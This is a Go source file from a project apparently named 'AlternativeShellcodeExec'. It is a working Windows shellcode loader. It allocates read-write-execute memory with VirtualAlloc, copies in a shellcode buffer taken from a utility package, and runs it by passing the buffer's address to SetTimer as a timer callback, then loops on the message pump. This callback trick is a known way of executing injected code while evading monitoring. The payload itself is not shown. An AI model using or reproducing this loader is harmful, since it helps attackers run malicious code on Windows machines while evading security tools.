package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_RESERVE            = 0x2000
	MEM_COMMIT             = 0x1000
	MEM_RELEASE            = 0x8000
	PAGE_EXECUTE_READWRITE = 0x40
)

// Run is the main function to process op
func Run(op []byte) {
	// Load required Windows libraries
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	user32 := syscall.MustLoadDLL("user32.dll")

	// Load required Windows functions
	virtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	virtualFree := kernel32.MustFindProc("VirtualFree")
	setTimer := user32.MustFindProc("SetTimer")
	getMessage := user32.MustFindProc("GetMessageW")
	dispatchMessage := user32.MustFindProc("DispatchMessageW")

	// Allocate memory with required permissions
	address, _, err := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if address == 0 {
		fmt.Printf("VirtualAlloc failed with error: %v\n", err)
		return
	}
	defer virtualFree.Call(address, 0, MEM_RELEASE)

	// Copy op into the allocated memory using a for loop
	for i := range op {
		*(*byte)(unsafe.Pointer(address + uintptr(i))) = op[i]
	}

	// Set a timer to execute the address
	dummy := uintptr(0)
	setTimer.Call(0, dummy, 0, uintptr(address))

	// Get and dispatch messages
	var msg struct {
		Hwnd    uintptr
		Message uint32
		WParam  uintptr
		LParam  uintptr
		Time    uint32
		Pt      struct {
			X int32
			Y int32
		}
	}
	for {
		getMessage.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
		dispatchMessage.Call(uintptr(unsafe.Pointer(&msg)))
	}
}

func main() {
	Run(util.ShellCode())
}
